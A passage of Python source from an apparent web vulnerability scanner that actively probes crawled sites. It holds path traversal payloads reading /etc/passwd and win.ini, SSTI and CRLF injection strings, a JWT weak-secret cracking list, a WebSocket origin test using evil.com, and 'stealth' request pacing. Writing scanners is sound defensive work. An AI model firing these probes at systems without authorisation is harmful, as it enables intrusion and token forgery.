    base   = parsed.scheme + "://" + parsed.netloc

    # Fetch current version's status to use as comparison baseline
    try:
        stealth_delay(domain)
        current_resp   = _get_session().get(
            page_url,
            headers=create_request_header(),
            timeout=6,
            allow_redirects=False,
            verify=False,
        )
        current_status = current_resp.status_code
    except Exception:
        return

    for delta in (-2, -1, 1):
        alt_ver_num = current_ver_num + delta
        if alt_ver_num < 1:
            continue
        alt_ver_str = f"v{alt_ver_num}"
        alt_path    = _API_VERSION_RE.sub(f"/{alt_ver_str}", parsed.path, count=1)
        alt_url     = base + alt_path + (("?" + parsed.query) if parsed.query else "")

        try:
            stealth_delay(domain)
            alt_resp   = _get_session().get(
                alt_url,
                headers=create_request_header(),
                timeout=6,
                allow_redirects=False,
                verify=False,
            )
            alt_status = alt_resp.status_code

            # 404 → doesn't exist; 401/403 → protected — both fine, skip
            if alt_status in (404, 401, 403):
                continue

            if alt_status == 200 and current_status in (401, 403):
                alert(
                    "API VERSION AUTHENTICATION BYPASS",
                    "HIGH",
                    alt_url,
                    f"API {alt_ver_str} at {alt_url} returns {alt_status} where "
                    f"current {current_ver_str} requires auth ({current_status}) — "
                    f"authentication controls may be absent on the older version"
                )
                print(timestamp() + f" [!!] API version auth bypass: {alt_url} "
                                    f"({alt_status}) vs {current_ver_str} ({current_status})")
            elif alt_status == 200:
                alert(
                    "OLDER API VERSION ACCESSIBLE",
                    "MEDIUM",
                    alt_url,
                    f"API {alt_ver_str} at {alt_url} returned {alt_status} — "
                    f"older versions may lack security controls present in "
                    f"{current_ver_str}; verify response structure manually"
                )
                print(timestamp() + f" [!] Older API version accessible: "
                                    f"{alt_url} ({alt_status})")
        except Exception as e:
            print_error(f"check_api_versioning failed for {alt_url}: {e}")


# ─────────────────────────────────────────────
# WebSocket endpoint detection and security checks
# ─────────────────────────────────────────────

# Match explicit ws:// or wss:// URLs in page source
_WS_URL_RE = re.compile(r'''\b(wss?://[^\s"'<>)]+)''', re.I)

# Match JS patterns that establish WebSocket connections
_WS_JS_PATTERNS = re.compile(
    r'''(?:new\s+WebSocket\s*\(|io\s*\(|socket\.connect\s*\()\s*["']?(wss?://[^\s"'<>)]+)["']?''',
    re.I
)

# Tracks WS URLs already security-tested this session
_ws_security_tested: set = set()
# Tracks WS URLs already stored in DB this session
_ws_stored: set = set()


def write_to_websockets_database(page_url: str, ws_url: str, encrypted: bool) -> None:
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "WebSockets")
        conn.execute(
            "INSERT INTO WebSockets (page_url, ws_url, encrypted, found_at) VALUES (?,?,?,?)",
            (page_url, ws_url, int(encrypted), timestamp())
        )
    except Exception as e:
        print_error("write_to_websockets_database: " + str(e))
    finally:
        conn.close()


def discover_websockets(page_url: str, html_content: str, response_headers: dict) -> None:
    """
    Scan page source and response headers for WebSocket endpoints.
    Runs unconditionally on every crawled page.
    Discovered endpoints are stored in the WebSockets table and, if
    --active-probes is enabled, passed to check_websocket_security().
    """
    if isinstance(html_content, bytes):
        html_content = html_content.decode("utf-8", errors="ignore")

    found: set = set()

    # 1. Explicit ws:// / wss:// literals in page source
    for m in _WS_URL_RE.finditer(html_content):
        found.add(m.group(1).strip())

    # 2. JavaScript WebSocket construction calls
    for m in _WS_JS_PATTERNS.finditer(html_content):
        found.add(m.group(1).strip())

    # 3. Response header: Upgrade: websocket — promote the page URL itself
    upgrade = response_headers.get("Upgrade", "").lower()
    if upgrade == "websocket":
        # Convert the page URL scheme to wss:// or ws://
        parsed = urlparse(page_url)
        ws_scheme = "wss" if parsed.scheme == "https" else "ws"
        ws_url = parsed._replace(scheme=ws_scheme).geturl()
        found.add(ws_url)

    for ws_url in found:
        if ws_url in _ws_stored:
            continue
        _ws_stored.add(ws_url)
        encrypted = ws_url.lower().startswith("wss://")
        write_to_websockets_database(page_url, ws_url, encrypted)
        print(timestamp() + f" [WS] Discovered WebSocket endpoint: {ws_url}")

        if ACTIVE_PROBES:
            check_websocket_security(ws_url, page_url)


def check_websocket_security(ws_url: str, page_url: str) -> None:
    """
    Run three security checks against a discovered WebSocket endpoint.
    Only called when --active-probes is enabled.
    Requires the 'websockets' library; silently skips if unavailable.
    """
    if not WEBSOCKETS_AVAILABLE:
        return
    if ws_url in _ws_security_tested:
        return
    _ws_security_tested.add(ws_url)

    domain = urlparse(page_url).netloc

    # ── Check 1: Unencrypted WebSocket ──────────────────────────────────────
    if ws_url.lower().startswith("ws://"):
        alert(
            "UNENCRYPTED WEBSOCKET",
            "MEDIUM",
            ws_url,
            f"WebSocket endpoint uses unencrypted ws:// scheme — traffic is "
            f"transmitted in plaintext and susceptible to eavesdropping and "
            f"manipulation by a network-level attacker"
        )
        print(timestamp() + f" [!] Unencrypted WebSocket: {ws_url}")

    # Async helpers run in a dedicated event loop inside the calling thread
    async def _origin_check() -> None:
        """Connect with a foreign Origin header; flag if server accepts it."""
        try:
            extra_headers = {"Origin": "https://evil.com"}
            async with websockets.connect(
                ws_url,
                additional_headers=extra_headers,
                open_timeout=5,
                close_timeout=5,
                ssl=None,
            ) as ws:
                # If we connected successfully the server accepted the origin
                alert(
                    "WEBSOCKET ORIGIN VALIDATION MISSING",
                    "HIGH",
                    ws_url,
                    f"WebSocket at {ws_url} accepted connection from arbitrary "
                    f"Origin 'https://evil.com' — the server does not validate "
                    f"the Origin header, enabling cross-site WebSocket hijacking "
                    f"(CSWSH) from any malicious page"
                )
                print(timestamp() + f" [!!] WS accepts arbitrary origin: {ws_url}")
        except (
            websockets.exceptions.InvalidStatus,
            websockets.exceptions.RejectHandshake,
            ConnectionRefusedError,
            OSError,
            asyncio.TimeoutError,
        ):
            pass  # Rejected or unreachable — expected for a secure server
        except Exception as e:
            print_error(f"WS origin check error ({ws_url}): {e}")

    async def _auth_check() -> None:
        """Connect without credentials; flag if the server sends data."""
        try:
            async with websockets.connect(
                ws_url,
                additional_headers={},  # no cookies, no auth
                open_timeout=5,
                close_timeout=5,
                ssl=None,
            ) as ws:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=5)
                    if msg:
                        alert(
                            "WEBSOCKET UNAUTHENTICATED DATA EXPOSURE",
                            "HIGH",
                            ws_url,
                            f"WebSocket at {ws_url} returned data without "
                            f"authentication credentials — unauthenticated clients "
                            f"can receive server messages; first {min(200, len(str(msg)))} bytes: "
                            f"{str(msg)[:200]!r}"
                        )
                        print(timestamp() + f" [!!] WS sends data without auth: {ws_url}")
                except asyncio.TimeoutError:
                    pass  # Server is waiting for client message — not necessarily a flaw
        except (
            websockets.exceptions.InvalidStatus,
            websockets.exceptions.RejectHandshake,
            ConnectionRefusedError,
            OSError,
            asyncio.TimeoutError,
        ):
            pass
        except Exception as e:
            print_error(f"WS auth check error ({ws_url}): {e}")

    def _run_checks() -> None:
        loop = asyncio.new_event_loop()
        try:
            loop.run_until_complete(_origin_check())
            loop.run_until_complete(_auth_check())
        finally:
            loop.close()

    t = threading.Thread(target=_run_checks, daemon=True)
    t.start()
    t.join(timeout=30)


# ─────────────────────────────────────────────
# Path traversal detection
# ─────────────────────────────────────────────

# Parameter names that commonly accept file paths or template names
PATH_TRAVERSAL_PARAMS = {
    "file", "path", "template", "page", "include", "load", "read",
    "document", "doc", "filename", "filepath", "name", "src", "source",
    "view", "content", "resource", "fetch", "url", "data", "input",
    "dir", "folder", "location", "route", "nav", "show", "display",
    "layout", "module", "conf", "config", "cfg", "setting",
}

# Traversal payloads — ordered from shallow to deep
# Each tuple: (payload, os_hint)
# os_hint: 'unix', 'windows', or 'both'
PATH_TRAVERSAL_PAYLOADS = [
    # Unix — /etc/passwd
    ("../../../etc/passwd",              "unix"),
    ("../../../../etc/passwd",           "unix"),
    ("../../../../../etc/passwd",        "unix"),
    ("../../../../../../etc/passwd",     "unix"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "unix"),   # URL-encoded
    ("..%2f..%2f..%2fetc%2fpasswd",      "unix"),           # partial encode
    ("....//....//....//etc/passwd",     "unix"),           # double-dot bypass
    # Unix — /etc/hosts (less sensitive but confirms traversal)
    ("../../../etc/hosts",               "unix"),
    ("../../../../etc/hosts",            "unix"),
    # Windows — win.ini
    ("..\\..\\..\\windows\\win.ini",     "windows"),
    ("../../../../windows/win.ini",      "windows"),
    ("%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "windows"),
    # Windows — system32/drivers/etc/hosts
    ("../../../../windows/system32/drivers/etc/hosts", "windows"),
]

# Signatures that confirm successful file read
PATH_TRAVERSAL_UNIX_SIGS = [
    "root:x:0:0",       # /etc/passwd
    "root:*:0:0",       # BSD /etc/passwd
    "daemon:x:",
    "/bin/bash",
    "/bin/sh",
    "127.0.0.1\tlocalhost",   # /etc/hosts
    "::1\tlocalhost",
]

PATH_TRAVERSAL_WIN_SIGS = [
    "[fonts]",          # win.ini
    "[extensions]",     # win.ini
    "[mci extensions]",
    "for 16-bit app support",
    "127.0.0.1",        # hosts file
]

_traversal_tested  = set()   # (base_url, param) already tested
_traversal_domains = set()   # domains already confirmed vulnerable

def check_path_traversal(page_url, html_content):
    """
    Parse links on the page for parameters that may accept file paths.
    For each unique (endpoint, param) pair, inject traversal sequences
    and check the response body for known file content signatures.

    Two-phase:
      1. Collect candidate parameters from page links
      2. For each untested (endpoint, param), try payloads until confirmed
         or exhausted

    Alerts CRITICAL on confirmed traversal with file content evidence.
    Deduplicates per domain — stops testing once one confirmed finding
    per domain is recorded (avoid hammering the server).
    """
    domain = urlparse(page_url).netloc
    if domain in _traversal_domains:
        return
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="replace")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # Collect candidate URLs from page links + current page URL
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href and href.startswith("http"):
            all_urls.append(href)

    traversal_params_lower = {p.lower() for p in PATH_TRAVERSAL_PARAMS}

    for raw_url in all_urls:
        if domain in _traversal_domains:
            break
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            if is_third_party_cdn(parsed.netloc):
                continue
            if not parsed.query:
                continue
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        for param in params:
            if param.lower() not in traversal_params_lower:
                continue
            if domain in _traversal_domains:
                break

            base_endpoint = parsed.scheme + "://" + parsed.netloc + parsed.path
            test_key = (base_endpoint, param)
            if test_key in _traversal_tested:
                continue
            _traversal_tested.add(test_key)

            print(timestamp() + f" Path traversal probe: {base_endpoint} param={param}")

            for payload, os_hint in PATH_TRAVERSAL_PAYLOADS:
                if domain in _traversal_domains:
                    break
                try:
                    # Build test URL with traversal payload
                    new_query = "&".join(
                        f"{k}={payload}" if k == param else f"{k}={v}"
                        for k, v in params.items()
                    )
                    test_url = base_endpoint + "?" + new_query

                    stealth_delay(domain)
                    resp = _get_session().get(
                        test_url,
                        headers=create_request_header(),
                        timeout=6,
                        allow_redirects=True,
                    )

                    if resp.status_code not in (200, 206):
                        continue

                    body = resp.text

                    # Check Unix signatures
                    unix_hit = [s for s in PATH_TRAVERSAL_UNIX_SIGS if s in body]
                    if unix_hit:
                        _traversal_domains.add(domain)
                        alert(
                            "PATH TRAVERSAL — FILE READ CONFIRMED",
                            "CRITICAL",
                            test_url,
                            f"Parameter '{param}' reads arbitrary files. "
                            f"Payload: {payload!r} — response contains: {unix_hit[0]!r}"
                        )
                        print(timestamp() + f" [!!] Path traversal confirmed: {test_url} "
                              f"param={param} payload={payload!r}")
                        break

                    # Check Windows signatures
                    win_hit = [s for s in PATH_TRAVERSAL_WIN_SIGS
                               if s.lower() in body.lower()]
                    if win_hit:
                        _traversal_domains.add(domain)
                        alert(
                            "PATH TRAVERSAL — FILE READ CONFIRMED",
                            "CRITICAL",
                            test_url,
                            f"Parameter '{param}' reads arbitrary files (Windows). "
                            f"Payload: {payload!r} — response contains: {win_hit[0]!r}"
                        )
                        print(timestamp() + f" [!!] Path traversal confirmed (Windows): "
                              f"{test_url} param={param} payload={payload!r}")
                        break

                except Exception as e:
                    print_error(f"Path traversal probe failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# JWT detection and weakness analysis
# ─────────────────────────────────────────────

import base64 as _b64

# Regex to find JWT tokens anywhere — cookies, headers, HTML, JS
JWT_REGEX = re.compile(
    r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{0,}'
)

# Weak secrets commonly used in development that get shipped to prod.
# Covers common patterns: generic words, framework defaults, env var patterns,
# company/app name placeholders, and common keyboard walks.
JWT_WEAK_SECRETS = [
    # Generic words
    "secret", "password", "123456", "test", "dev", "development",
    "production", "change_me", "changeme", "your-secret", "your_secret",
    "jwt_secret", "jwtsecret", "supersecret", "super_secret",
    "mysecret", "my_secret", "app_secret", "appsecret",
    "secret_key", "secretkey", "private_key", "privatekey",
    "default", "example", "sample", "demo", "admin",
    # Framework / library defaults
    "django-insecure-", "flask-secret", "laravel_secret", "rails_secret",
    "express-session-secret", "cookie-secret", "session-secret",
    "your-256-bit-secret", "your-512-bit-secret",
    "HS256", "HS384", "HS512",
    # Common placeholder patterns
    "changethis", "change-this", "replace-me", "replaceme", "todo",
    "fixme", "pleasechangeme", "please_change_me", "updatethis",
    "insert_secret_here", "put_secret_here", "put-your-secret-here",
    "CHANGE_ME", "REPLACE_ME", "YOUR_SECRET_HERE",
    # Short / trivial
    "1", "12", "123", "1234", "12345", "123456789", "1234567890",
    "pass", "passwd", "password1", "password123", "passw0rd",
    "qwerty", "qwerty123", "letmein", "welcome", "login",
    "abc", "abc123", "abcdef", "abcdefgh",
    # Common app/env patterns
    "app", "app_key", "appkey", "application", "application_secret",
    "api", "api_key", "apikey", "api_secret", "apisecret",
    "auth", "auth_secret", "auth_key", "authkey", "auth_token",
    "token", "token_secret", "access_token", "refresh_token",
    "key", "mykey", "my_key", "private", "public",
    "prod", "production_secret", "prod_secret",
    "staging", "staging_secret",
    "local", "localhost",
    # Node / Express
    "keyboard cat", "keyboard_cat", "express", "express-secret",
    "session", "sessions", "cookie", "cookies",
    # Python / Django / Flask
    "django", "flask", "python", "pythonsecret",
    "SECRET_KEY", "secret_key_goes_here",
    # Java / Spring
    "spring", "spring-boot", "java", "springboot",
    "mySecretKey", "jwtSecretKey",
    # PHP / Laravel
    "laravel", "php", "symfony", "silex",
    # Ruby / Rails
    "rails", "ruby", "sinatra",
    # Go
    "golang", "go-secret",
    # Database
    "mysql", "postgres", "mongodb", "redis",
    # Common names / keyboard walks
    "admin123", "administrator", "root", "toor", "master",
    "iloveyou", "sunshine", "monkey", "dragon", "baseball",
    "qwerty", "azerty", "zxcvbn", "1q2w3e4r", "q1w2e3r4",
    "asdfgh", "asdfghjkl", "zxcvbnm",
    # Docker / CI / infra defaults
    "docker", "kubernetes", "k8s", "jenkins", "gitlab",
    "travis", "circleci", "github",
    # Numbers
    "111111", "222222", "333333", "999999", "000000",
    "11111111", "99999999", "00000000",
    # JWT-specific common leaks seen in public GitHub repos
    "your_jwt_secret", "jwt-secret-key", "jwt_key", "jwtkey",
    "jwt-signing-secret", "signing-secret", "sign_secret",
    "hmac-secret", "hmac_secret", "token_key", "token-key",
    "bearer", "bearer_secret",
    # Company/product placeholder names
    "myapp", "my-app", "mywebsite", "my-website", "myservice",
    "acme", "acmecorp", "example.com", "test.com",
    # Length-1 to common short secrets
    "s", "ss", "sss", "key", "keys",
    "x", "xx", "xxx", "secret1", "Secret1", "Secret123",
]

# jwt.io demo token — shown on the jwt.io homepage and in tutorials everywhere
_JWT_DEMO_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ"
    ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
)
_JWT_DEMO_SIG = _JWT_DEMO_TOKEN.split(".")[-1]

# Cracked secrets that are known documentation placeholders — not real leaks
_JWT_PLACEHOLDER_SECRETS = {
    "your-256-bit-secret", "your-512-bit-secret", "secret", "your-secret",
}

_jwt_seen    = set()   # deduplicate by token signature (last segment)
_jwt_domains = set()   # domains already reported

def _b64_decode_segment(segment):
    """Base64url-decode a JWT segment, padding as needed."""
    padding = 4 - len(segment) % 4
    if padding != 4:
        segment += "=" * padding
    try:
        return _b64.urlsafe_b64decode(segment).decode("utf-8", errors="replace")
    except Exception:
        return ""

def _hmac_sign(secret, header_b64, payload_b64):
    """Return base64url-encoded HMAC-SHA256 signature."""
    import hmac as _hmac
    import hashlib as _hashlib
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = _hmac.new(secret.encode(), msg, _hashlib.sha256).digest()
    return _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()

def analyse_jwt(token, source_url):
    """
    Decode and analyse a JWT for security weaknesses:
      1. alg: none — signature entirely bypassed
      2. Weak HS256 secret — brute-force against common passwords
      3. Expired token still in use — server may not validate exp
      4. Sensitive data in payload — PII/credentials in cleartext

    Alerts CRITICAL for alg:none and confirmed weak secrets.
    Alerts HIGH for sensitive payload data.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return

    # Suppress the jwt.io demo token — it appears in tutorials and examples everywhere
    sig = parts[2]
    if sig == _JWT_DEMO_SIG:
        return

    # Deduplicate by signature segment
    if sig in _jwt_seen:
        return
    _jwt_seen.add(sig)

    header_raw  = _b64_decode_segment(parts[0])
    payload_raw = _b64_decode_segment(parts[1])

    try:
        header  = json.loads(header_raw)
        payload = json.loads(payload_raw)
    except Exception:
        return  # malformed — skip

    alg = str(header.get("alg", "")).lower()

    # ── 1. alg: none ──────────────────────────────────────────
    if alg == "none":
        alert(
            "JWT ALG:NONE — SIGNATURE BYPASS",
            "CRITICAL",
            source_url,
            f"JWT uses alg:none — signature not verified. "
            f"Subject: {payload.get('sub', payload.get('user', '?'))}",
            redact_detail=False
        )
        print(timestamp() + f" [!!] JWT alg:none at {source_url}")
        return

    # ── 2. Weak HS256 secret ───────────────────────────────────
    if alg == "hs256":
        for secret in JWT_WEAK_SECRETS:
            expected = _hmac_sign(secret, parts[0], parts[1])
            if expected == parts[2]:
                # Suppress known documentation placeholders — not real findings
                if secret.lower() in _JWT_PLACEHOLDER_SECRETS:
                    break
                alert(
                    "JWT WEAK SECRET",
                    "CRITICAL",
                    source_url,
                    f"JWT HS256 secret cracked: '{secret}'. "
                    f"Full token forgery possible. "
                    f"Subject: {payload.get('sub', '?')}",
                    redact_detail=False
                )
                print(timestamp() + f" [!!] JWT weak secret '{secret}' at {source_url}")
                return

    # ── 3. Expired token ──────────────────────────────────────
    exp = payload.get("exp")
    if exp:
        try:
            import time as _time
            if _time.time() > float(exp):
                print(timestamp() + f" JWT expired token still present: {source_url}")
                write_to_js_database(source_url, source_url, "jwt_expired",
                                     f"exp={exp} sub={payload.get('sub','?')}")
        except Exception:
            pass

    # ── 4. Sensitive data in payload ─────────────────────────
    sensitive_keys = {"password", "passwd", "secret", "token", "key",
                      "ssn", "credit_card", "card_number", "cvv"}
    found_sensitive = [k for k in payload if k.lower() in sensitive_keys]
    if found_sensitive:
        domain = urlparse(source_url).netloc
        if domain not in _jwt_domains:
            _jwt_domains.add(domain)
            alert(
                "JWT SENSITIVE PAYLOAD DATA",
                "HIGH",
                source_url,
                f"JWT payload contains sensitive fields: {found_sensitive}. "
                f"JWT payloads are base64-encoded, NOT encrypted."
            )

    print(timestamp() + f" JWT analysed: alg={alg} sub={payload.get('sub','?')} iss={payload.get('iss','?')} at {source_url}")

def scan_for_jwts(source_url, content, response_headers=None):
    """
    Scan page HTML, JS content, and response headers/cookies for JWTs
    and analyse each unique one found.
    """
    text = content if isinstance(content, str) \
           else content.decode("utf-8", errors="replace") if content else ""

    # Scan body content
    for token in JWT_REGEX.findall(text):
        analyse_jwt(token, source_url)

    # Scan Set-Cookie and Authorization headers
    if response_headers:
        for header_name in ("Set-Cookie", "set-cookie", "Authorization", "authorization"):
            val = response_headers.get(header_name, "")
            if val:
                for token in JWT_REGEX.findall(val):
                    analyse_jwt(token, source_url)


# ─────────────────────────────────────────────
# Server-Side Template Injection (SSTI) detection
# ─────────────────────────────────────────────

# SSTI payload templates — {A} and {B} are replaced with random large integers
# per test run so the expected product can't appear coincidentally on the page.
# Each tuple: (payload_template, engine_hint)
SSTI_PAYLOAD_TEMPLATES = [
    ("{{{{A}}*{{B}}}}",   "Jinja2/Twig/Pebble"),
    ("${{{A}*{B}}}",      "Freemarker/Spring/Velocity"),
    ("#{{{A}*{B}}}",      "Thymeleaf"),
    ("<%= {A}*{B} %>",    "ERB/EJS"),
    ("${{{{A}}*{{B}}}}",  "Pebble (alt syntax)"),
]

# URL-accepting parameters should not be tested for SSTI — they produce
# false positives (e.g. Facebook share.php?u=) and are already covered by
# SSRF candidate flagging.
_SSTI_URL_PARAMS = {
    "u", "url", "uri", "redirect", "return", "returnurl", "next",
    "target", "dest", "destination", "go", "goto", "link", "src",
    "source", "ref", "referrer", "callback", "image", "img",
    "proxy", "feed", "endpoint", "webhook",
}

_ssti_tested  = set()   # (base_url, param) pairs already probed
_ssti_domains = set()   # domains where SSTI was confirmed

def check_ssti(page_url, html_content):
    """
    Probe URL parameters for Server-Side Template Injection.

    Uses randomly generated large integers (e.g. 8231 * 6197 = 51,007,307)
    as the expected marker so it cannot appear coincidentally in page content.
    Skips URL-accepting parameters (covered by SSRF flagging) to avoid
    false positives on sharing/redirect endpoints like Facebook share.php?u=.
    Alerts CRITICAL only when the exact product appears in the response and
    the raw payload was not literally echoed back.
    """
    import random as _random
    domain = urlparse(page_url).netloc
    if domain in _ssti_domains:
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # Collect (base_url, query_string, param, original_value) candidates
    candidates = []
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    for raw_url in all_urls:
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            if not parsed.query:
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            for pair in parsed.query.split("&"):
                if "=" not in pair:
                    continue
                k, v = pair.split("=", 1)
                # Skip URL-accepting params — not template contexts
                if k.lower() in _SSTI_URL_PARAMS:
                    continue
                v_clean = re.sub(r'^https?://', '', v)
                candidates.append((base, parsed.query, k, v_clean))
        except Exception:
            continue

    for base, query, param, original_val in candidates:
        if domain in _ssti_domains:
            break

        test_key = (base, param)
        if test_key in _ssti_tested:
            continue
        _ssti_tested.add(test_key)

        # Fresh random operands per (endpoint, param) pair — product is unique
        a = _random.randint(1000, 9999)
        b = _random.randint(1000, 9999)
        marker = str(a * b)   # e.g. "51007307" — extremely unlikely to appear naturally

        for tmpl, engine_hint in SSTI_PAYLOAD_TEMPLATES:
            payload = tmpl.format(A=a, B=b)
            new_query = "&".join(
                f"{k}={payload}" if k == param else f"{k}={v}"
                for k, v in (p.split("=", 1) for p in query.split("&") if "=" in p)
            )
            test_url = base + "?" + new_query
            try:
                stealth_delay(domain)
                resp = _get_session().get(
                    test_url,
                    headers=create_request_header(),
                    timeout=5,
                    allow_redirects=True,
                )
                # Confirm: exact product in response AND raw payload not literally echoed
                if marker in resp.text and payload not in resp.text:
                    _ssti_domains.add(domain)
                    alert(
                        "SERVER-SIDE TEMPLATE INJECTION (SSTI)",
                        "CRITICAL",
                        test_url,
                        f"Parameter '{param}' evaluated template expression. "
                        f"Payload: {payload} → response contains '{marker}'. "
                        f"Engine hint: {engine_hint}. RCE may be possible."
                    )
                    print(timestamp() + f" [!!] SSTI confirmed: {test_url} (param={param}, engine={engine_hint})")
                    return
            except Exception as e:
                print_error(f"SSTI probe failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# CRLF injection detection
# ─────────────────────────────────────────────

_CRLF_CANARY_HEADER = "X-CRLF-Test"
_CRLF_CANARY_VALUE  = "nuscrape-crlf-canary"
# URL-encoded CR+LF followed by the injected header
_CRLF_PAYLOAD       = f"%0d%0a{_CRLF_CANARY_HEADER}:%20{_CRLF_CANARY_VALUE}"

_crlf_tested  = set()   # (endpoint, param) pairs already probed
_crlf_domains = set()   # domains with a confirmed finding — stop after first

def check_crlf_injection(page_url, html_content):
    """
    For each URL parameter found on the page, append a CRLF payload and
    check whether the canary header appears in the response headers.
    Only tests parameters on in-scope URLs. Deduplicates per (endpoint, param).
    Stops after one confirmed finding per domain.
    """
    domain = urlparse(page_url).netloc
    if domain in _crlf_domains:
        return
    if not is_in_scope(page_url):
        return
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    all_urls = [page_url]
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href and href.startswith("http"):
            all_urls.append(href)

    for raw_url in all_urls:
        if domain in _crlf_domains:
            break
        if not is_in_scope(raw_url):
            continue
        if is_third_party_cdn(urlparse(raw_url).netloc):
            continue
        try:
            parsed = urlparse(raw_url)
            if not parsed.query:
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        for param, value in params.items():
            if domain in _crlf_domains:
                break
            test_key = (base, param)
            if test_key in _crlf_tested:
                continue
            _crlf_tested.add(test_key)

            injected_value = value + _CRLF_PAYLOAD
            new_query = "&".join(
                f"{k}={injected_value}" if k == param else f"{k}={v}"
                for k, v in params.items()
            )
            test_url = base + "?" + new_query
            try:
                stealth_delay(domain)
                resp = _get_session().get(
                    test_url,
                    headers=create_request_header(),
                    timeout=5,
                    allow_redirects=False,
                )
                # Check if canary header was reflected in the response
                if _CRLF_CANARY_VALUE in resp.headers.get(_CRLF_CANARY_HEADER, ""):
                    _crlf_domains.add(domain)
                    alert(
                        "CRLF INJECTION",
                        "HIGH",
                        test_url,
                        f"Parameter '{param}' reflects injected CRLF sequence — "
                        f"'{_CRLF_CANARY_HEADER}: {_CRLF_CANARY_VALUE}' appeared in response headers. "
                        f"Exploitable for header injection, log poisoning, and response splitting."
                    )
                    print(timestamp() + f" [!!] CRLF injection confirmed: {base} param='{param}'")
            except requests.exceptions.Timeout:
                pass
            except Exception as e:
                print_error(f"CRLF probe failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# XXE injection detection
# ─────────────────────────────────────────────

# Safe canary — confirms entity processing without reading sensitive files.
# The DOCTYPE declares a static string entity; if the parser resolves it and
# reflects it in the response we know entity expansion is enabled.
_XXE_CANARY      = "xxe-test-nuscrape"
_XXE_PAYLOAD     = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE test [\n'
    '  <!ENTITY xxe "xxe-test-nuscrape">\n'
    ']>\n'
    '<test>&xxe;</test>'
)
_XXE_SOAP_PAYLOAD = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE test [\n'
    '  <!ENTITY xxe "xxe-test-nuscrape">\n'
    ']>\n'
    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n'
    '  <soapenv:Body>\n'
    '    <test>&xxe;</test>\n'
    '  </soapenv:Body>\n'
    '</soapenv:Envelope>'
)

# Content-Type values that indicate the server accepts XML input
_XML_CONTENT_TYPES = {
    "text/xml",
    "application/xml",
    "application/soap+xml",
    "application/xhtml+xml",
}

# URL path suffixes / segments that strongly suggest XML / SOAP endpoints
_SOAP_PATH_RE = re.compile(
    r'/(ws|soap|wsdl|service|services|xmlrpc|xml-rpc|rpc)(/|$|\?)',
    re.I
)

# File upload inputs that accept .xml files
_XML_UPLOAD_RE = re.compile(r'\.xml\b', re.I)

# Tracks endpoints already tested this session
_xxe_tested: set = set()


def _collect_xxe_endpoints(page_url: str, html_content: str, response_headers: dict) -> list:
    """
    Return a list of (endpoint_url, is_soap) tuples that are candidates for
    XXE testing, derived from:
      1. The page URL itself if the server responded with an XML Content-Type
      2. SOAP path patterns in the page URL
      3. Form actions with file-upload inputs accepting .xml
      4. Anchor hrefs matching SOAP path patterns
    """
    domain   = urlparse(page_url).netloc
    ct       = response_headers.get("Content-Type", "").lower().split(";")[0].strip()
    candidates = []

    # 1. Server responded with XML — the endpoint itself accepts XML input
    if ct in _XML_CONTENT_TYPES:
        is_soap = "soap" in ct
        candidates.append((page_url, is_soap))

    # 2. SOAP path in the page URL
    if _SOAP_PATH_RE.search(urlparse(page_url).path):
        candidates.append((page_url, True))

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return candidates

    # 3. File upload forms accepting .xml
    for form in soup.find_all("form"):
        for inp in form.find_all("input", type="file"):
            accept = inp.get("accept", "")
            if _XML_UPLOAD_RE.search(accept):
                action = form.get("action") or page_url
                ep = urljoin(page_url, action)
                if urlparse(ep).netloc == domain:
                    candidates.append((ep, False))

    # 4. SOAP-looking links on the page
    for tag in soup.find_all(["a", "link"]):
        href = tag.get("href") or ""
        if not href:
            continue
        abs_href = urljoin(page_url, href)
        if urlparse(abs_href).netloc != domain:
            continue
        if _SOAP_PATH_RE.search(urlparse(abs_href).path):
            candidates.append((abs_href, True))

    # Deduplicate while preserving order; prefer is_soap=True for duplicates
    seen   = {}
    result = []
